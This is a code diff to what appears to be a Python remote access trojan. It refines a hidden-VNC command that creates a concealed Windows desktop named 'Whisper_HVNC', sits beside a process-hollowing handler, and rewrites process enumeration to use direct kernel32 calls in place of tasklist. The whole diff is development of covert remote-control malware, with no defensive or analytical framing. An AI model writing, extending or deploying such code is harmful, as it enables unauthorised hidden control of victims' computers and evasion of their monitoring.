@@ -822,12 +822,13 @@ _CMDS["search"] = _cmd_search
 _hvnc_name = "Whisper_HVNC_" + str(os.getpid())
 _hvnc_desk = None
 _hvnc_run = [False]
+_DESKTOP_ACCESS = 0x1000
 
 def _hvnc_thread():
     global _hvnc_desk
     import ctypes
     u32 = ctypes.windll.user32
-    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, 0x1000, None)
+    desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, _DESKTOP_ACCESS, None)
     if not desk:
         _hvnc_desk = None; _hvnc_run[0] = False; return
     _hvnc_desk = desk; _hvnc_run[0] = True
@@ -849,7 +850,7 @@ def _cmd_hvnc_start(m):
     threading.Thread(target=_hvnc_thread, daemon=True).start()
     time.sleep(0.5)
     if _hvnc_desk: return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
-    return {"output": "[!] HVNC failed - create thread failed"}
+    return {"output": "[!] HVNC failed - create desktop failed (need interactive session with desktop creation rights)"}
 
 def _cmd_hvnc_stop(m):
     _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}
@@ -1507,14 +1508,24 @@ def _cmd_process_hollow(m):
 def _cmd_list_processes(m):
     try:
         if platform.system() != "Windows": return {"output": "[!] Process listing requires Windows"}
-        out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"], timeout=10, creationflags=0x08000000).decode(errors="replace")
+        import ctypes
+        k32 = ctypes.windll.kernel32
+        MAX = 1024; ids = (ctypes.c_ulong * MAX)(); needed = ctypes.c_ulong()
+        if not k32.EnumProcesses(ids, ctypes.sizeof(ids), ctypes.byref(needed)):
+            return {"output": "[!] EnumProcesses failed"}
+        count = needed.value // ctypes.sizeof(ctypes.c_ulong)
         lines = []
-        for line in out.split("\n"):
-            if line.strip():
-                parts = [p.strip('" ') for p in line.split(",")]
-                if len(parts) >= 2:
-                    lines.append(f"  {parts[1]:>6s}  {parts[0][:30]}")
-                    if len(lines) >= 50: break
+        for i in range(min(count, 50)):
+            pid = ids[i]
+            h = k32.OpenProcess(0x1000 | 0x0400, False, pid)
+            name = "N/A"
+            if h:
+                buf = ctypes.create_unicode_buffer(260)
+                sz = ctypes.c_ulong(260)
+                if k32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(sz)):
+                    name = os.path.basename(buf.value)
+                k32.CloseHandle(h)
+            lines.append(f"  {pid:>6d}  {name[:40]}")
         return {"output": "[+] Processes (PID, Name):\n" + "\n".join(lines)}
     except Exception as e: return {"output": f"[!] Process list error: {e}"}
 
